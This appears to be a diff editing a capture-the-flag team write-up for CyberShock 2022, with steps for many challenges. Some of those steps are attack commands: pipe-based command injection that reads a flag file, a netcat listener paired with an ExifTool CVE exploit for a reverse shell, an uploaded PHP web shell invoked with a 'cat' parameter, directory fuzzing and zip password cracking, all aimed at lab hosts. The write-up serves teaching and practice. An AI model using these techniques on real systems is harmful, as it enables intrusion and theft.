@@ -312,14 +312,15 @@ The answer can be found in the /etc/apt/ folder
 
 ##### Solution
 
-Solution here was to notice error when passing `|` character and after `|` character you can inject your shell payload.
+Solution here was to notice error when passing `|` character and after `|` character we can perform command
+injection to find and reveal the flag.
 
 ##### Steps
 
-1. NC into server `nc -nv 10.93.26.3 2333`
-2. After trying verious payloads notice that when passing `|` gives us error `Fridge is self-aware! Error: 0x0 dumping stack trace: ' .  . '`
-3. Search for files in /etc/apt folder `| ls -a /etc/apt` shows as file `.flag.txt`
-4. Final payload `| cat /etc/apt/.flag.txt` gives us flag: `Flag: ctf-tech{2deb997d-1f67}`
+1. Connect to the server using netcat `nc -nv 10.93.26.3 2333`.
+2. After trying verious payloads we notice that when passing `|` an error is thrown: `Fridge is self-aware! Error: 0x0 dumping stack trace: ' .  . '`
+3. Search for files in /etc/apt folder using the command inject we found `| ls -a /etc/apt` which leads us to the flag file `.flag.txt`.
+4. Final payload `| cat /etc/apt/.flag.txt` gives us flag.
 ![Fridge payload](../../images/cybershock-2022-fridge.png){: .image-process-crisp}
 
 #### MAILBOX
@@ -602,7 +603,7 @@ This looks like the correct path and we can finally find the flag decrypting ano
 flag is 81681775-2a14-4639-8d24-5262e521267f
 ```
 
-#### HOMEWORK (UNSOLVED)
+#### HOMEWORK (UNSOLVED by us)
 
 ```md
 DESCRIPTION
@@ -613,7 +614,7 @@ Solve the homework to reveal the answer in flag.txt
 Homework
 ```
 
-#### EMOJI ANALYSIS (UNSOLVED)
+#### EMOJI ANALYSIS (UNSOLVED by us)
 
 ```md
 DESCRIPTION
@@ -621,7 +622,7 @@ You find a strange note from your backpack.
 PS! There is also a post-it-note on the backside of the paper where are written the following numbers 32 54 80 46 155.
 QUESTION
 Figure out what the note means and find the flag.
-strange note: <https://static.ctftech.io/challs/encoded_story.html?_gl=1>*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
+strange note: https://static.ctftech.io/challs/encoded_story.html?_gl=1*1oieq6w*_ga*NzI4Nzc3OTA2LjE2NjQ4NjIzOTc.*_ga_MKDT1BJ3MH*MTY2NDk0OTc0MC4xMS4xLjE2NjQ5NDk3NDEuMC4wLjA.
 ```
 
 ### SMART CITY
@@ -646,10 +647,8 @@ Since entering in a regular IPv4 format address returned *"Not a public IP addre
 ##### Steps
 
 1. Go to <https://dnschecker.org/ip-to-decimal.php> and convert `172.20.10.2` IP address to decimal numeral system.
-
 2. The desired output is an integer number: `2886994434`, which bypasses IP address filtering.
-
-3. As seen in the screen below, the flag is: `ctftech{iP_nUmB3rz_@r3_4un}`.
+3. And the flag was found.
 
 ![Automated flag](../../images/health-check-flag.png){: .image-process-crisp}
 
@@ -674,26 +673,33 @@ Password: Cool2Pass
 
 ##### Solution
 
-Solution here was to harden ssh login, disable root login & disable password login for this server.
+Solution here was to harden ssh authentication, disabling root login and password login for this server instead
+adding public key authentication.
+
+The solution was validated by an automated bash script in the CTF platform.
 
 ##### Steps
 
 1. SSH into server `ssh -i id_rsa sysadmin@env263.target02 -p 2224`
-2. `nano /etc/ssh/sshd_config` and add at end of file 
+2. `nano /etc/ssh/sshd_config` and add the following contents at the end of the file
+
 ```
 PasswordAuthentication no
 UsePAM no
 PermitRootLogin no
 PermitRootLogin prohibit-password
 ```
-and restart server `/etc/init.d/ssh reload`
-3. Add public key as authroized key.
-```
+
+3. Restart server `/etc/init.d/ssh reload`
+4. Add public key into `~/.ssh/authorized_keys`.
+
+```bash
 mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys
 chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
 nano .ssh/authorized_keys 
 ```
-4. Then we made sure that we can't login as root & with password, submitted for assessment & it's done.
+
+5. Then we made sure that we can't login as root and with password. Finally we submitted the task for assessment and it succeeded.
 
 #### NEXIF
 
@@ -716,7 +722,7 @@ Quick google search reveals to us that ExifTool is a free and open-source softwa
 2. Launch a `netcat` utility reverse shell listener on `9001` port: `nc -lvnp 9001`
 3. Launch a CVE exploit and specify IP address through `-s` flag: `python3 exploit-CVE-2021-22204.py -s 10.X.Y.Z 9001` (here the real IPv4 address is hidden on purpose).
 4. Upload any file to the ExifTool service.
-5. Shell exploit works - by looking inside `/home` folder a suspicious `/user1337` folder is found - inside it a `flag.txt` file can be seen. Retrieved flag from the file is : `ctftech{ff379755-33f3}`.
+5. Shell exploit works - by looking inside `/home` folder a suspicious `/user1337` folder is found - inside it a `flag.txt` file can be seen. Retrieved flag from the file.
 
 #### SMART BIKE
 
@@ -801,14 +807,14 @@ Password: autonomous1337vehicles
 
 ##### Solution
 
-Solution here was look for active running processes and one of processes contained flag, but this may not be intended path to solve this.
+Solution here was to look for active running processes and one of processes contained flag, but this may have not been the intended path.
 
 ##### Steps
 
 1. SSH into server `ssh jack@env263.target03 -p2222`
-2. `ps aux` shows interesting running processes
+2. `ps aux` shows interesting running processes.
    ![ps aux results](../../images/cybershock-2022-self-driving-car-1.png){: .image-process-crisp}
-3. CD into folder & cat autonomous_shuttle_statushandler.py gives us flag.
+3. `cd` into folder and `cat autonomous_shuttle_statushandler.py` gives us flag.
    ![content of autonomous_shuttle_statushandler.py](../../images/cybershock-2022-self-driving-car-2.png){: .image-process-crisp}
 
 #### BUS STOP
@@ -833,7 +839,7 @@ flag was all over the page. :)
 
 ##### Steps
 
-To get the flag, simply open webpage and the flag is there..
+To get the flag, simply open webpage and the flag is there.
 
 #### MAPS
 
@@ -849,18 +855,18 @@ http://env263.target03:8111/
 
 ##### Solution
 
-Solution here was to upload PHP file & get RCE & read /var/flag.txt content
+Solution here was to upload PHP file, get RCE and read /var/flag.txt content
 
 ##### Steps
 
-1. Notice in HTML content commented out path `<!-- <a href="/smartupload">Update logo</> //disabled no need for logo update -->`
+1. Notice in HTML content the commented out endpoint `<!-- <a href="/smartupload">Update logo</> //disabled no need for logo update -->`
 2. In /smartupload we where able to upload files but where do the go?
-3. After fuzzing `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed `/smartupload/uploads` folder.
-4. After opening BURP & modifying POST content we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
+3. After fuzzing with `gobuster dir -u http://env263.target03:8111/smartupload/ -w /usr/share/seclists/Discovery/Web-Content/common.txt` we noticed the `/smartupload/uploads` folder.
+4. After opening BURP and modifying the POST request contents we can see `?msg=success` redirect location that indicates that our file was uploaded successfully.
    ![Burp payload for php shell](../../images/cybershock-2022-maps.png){: .image-process-crisp}
-5. As we already know that files go into `/smartupload/uploads` path we go into our url `http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt` and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`
+5. As we already know that files go into `/smartupload/uploads` path we go into our url `http://env263.target03:8111/smartupload/uploads/filename2.png?c=cat%20/var/flag.txt` and receive flag `?PNG  Flag: 3760cbd5-d23b-4517-8aee-26f43cb178d4`.
 
-#### REGISTRY (UNSOLVED)
+#### REGISTRY (UNSOLVED by us)
 
 ```md
 DESCRIPTION
@@ -873,7 +879,7 @@ What is SHA-256 hash of the registry cell that contains value of HKLM\SYSTEM\Con
 Submit the answer in hex-printed from, lower-case letters, without any separators.
 ```
 
-#### ONE TIME PAD (UNSOLVED)
+#### ONE TIME PAD (UNSOLVED by us)
 
 ```md
 DESCRIPTION
@@ -909,21 +915,19 @@ Using the CTF discord invite link a CTF Tech Bot was visible as one of the first
 
 1. After sliding into the bot's DM's a *!minictf* was sent that resulted in the following reply:
 
-![Command output](../../images/automated-minictf.png){: .image-process-crisp}
+![Command output](images/automated-minictf.png){: .image-process-crisp}
 
 Correct answer is 00100000 (converting 32 from decimal to binary).
 
 2. After that the following question was provided:
 
-![Linux answer](../../images/automated-linux.png){: .image-process-crisp}
+![Linux answer](images/automated-linux.png){: .image-process-crisp}
 
 It is widely known that Linux is beneficial due to excellent performance rates and stability.
 
 3. After that a flag was provided to the team with ease:
 
-![Automated flag](../../images/automated-flag.png){: .image-process-crisp}
-
-CTF flag is: `ctftech{a1e5ba14-d542-416e-b981-9221765f8a8b}`.
+![Automated flag](images/automated-flag.png){: .image-process-crisp}
 
 #### BOARDING PASS
 
@@ -950,12 +954,12 @@ Submit the new barcode data as an answer.
 
 ##### Solution
 
-Solution here was to understand structure of bar code given in boarding pass & modify it's content.
+Solution here was to understand structure of bar code given in boarding pass and modify it's content.
 
 ##### Steps
 
-1. We used online tool https://online-barcode-reader.inliteresearch.com/ to extract current barcode text that was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
-2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/
+1. We used an online tool https://online-barcode-reader.inliteresearch.com/ to extract current barcode text which was: `M1RAMBO/JOHN        EHKGZFR TLLRIXEE 4253 269Y004D0021`
+2. After searching on internet how the structure of boarding pass tickets are built we managed to understand existing structure: https://javadude.wordpress.com/2017/10/07/whats-in-my-boarding-pass-barcode/
 3. We did our modification on barcode text that ended up with: `M1RAMBO/JOHN ECTF123 TAYSYDEE 0777 269Y004D0021`
 
 In our modification: E stands for electronic ticket, CTF123 stands for ticket number, TAY stands for Tartu airport number, SYD stands for Sydnay airport number, EE stands for Nordic airline, 0777 stands for our flight number
@@ -1048,11 +1052,17 @@ Answer is the md5sum of the combined file
 
 ##### Solution
 
-Solution here was to merge two files into one & get md5sum of the file.
+Solution here was to merge two files into one and get the md5sum of the file.
 
 ##### Steps
 
-1. `paste -d '\n' split1.csv split2.csv | grep . | md5sum` that returned flag `b6b66519836c741847ebc82f72ad45c6`
+1. Simply run the following bash one-liner:
+
+```bash
+paste -d '\n' split1.csv split2.csv | grep . | md5sum
+```
+
+- the md5sum was sumbitted, which was the flag.
 
 #### TOP-SECRET
 
@@ -1079,8 +1089,9 @@ Password: Cool2Pass
 The challenge was solved by connecting to the server, adding authentication to the `evidence` folder and after a restart of the service it was possible to get the flag by "submit'ing" the challenge which used a script to check if the authentication was correctly set.
 
 Links used when going through the challenge:
-- https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/
-- https://coderwall.com/p/zvvgna/create-htpasswd-file-for-nginx-without-apache
+
+- <https://www.howtogeek.com/devops/how-to-setup-basic-http-authentication-on-apache/>
+- <https://coderwall.com/p/zvvgna/create-htpasswd-file-for-nginx-without-apache>
 
 ##### Steps
 
@@ -1167,7 +1178,7 @@ find -name layer.tar -exec tar -xf {} \;
 
 5. A `persistence.sh` script can be seen in the screenshots above and to get the flag simply open it.
 
-#### LEAKED DATA (UNSOLVED)
+#### LEAKED DATA (UNSOLVED by us)
 
 ```md
 DESCRIPTION
@@ -1218,7 +1229,7 @@ ffuf -w /usr/share/wordlists/dirbuster/directories.jbrofuzz -u http://env263.tar
 
 - Cracked password is: `987654321`.
 
-![Encrypted ZIP](../../images/atc-zip.png){: .image-process-crisp}
+![Encrypted ZIP](images/atc-zip.png){: .image-process-crisp}
 
 4. Enter password in the archive and retrieve the flag.
 
@@ -1263,7 +1274,7 @@ Database                [Status: 200, Size: 321, Words: 22, Lines: 23, Duration:
 
 ```bash
 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt "backup.zip"
-``` 
+```
 
 - the password was `987654321`.
 
